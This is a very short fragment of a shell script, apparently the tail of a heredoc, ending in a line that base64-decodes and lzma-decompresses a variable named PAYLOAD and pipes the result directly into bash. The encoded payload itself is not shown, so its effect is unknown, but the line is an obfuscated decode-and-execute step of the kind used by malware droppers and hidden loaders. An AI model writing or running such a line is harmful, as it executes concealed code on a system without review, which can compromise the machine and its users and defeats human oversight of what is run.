EOF
)
printf '%s' "$PAYLOAD" | base64 -d | lzma -d | bash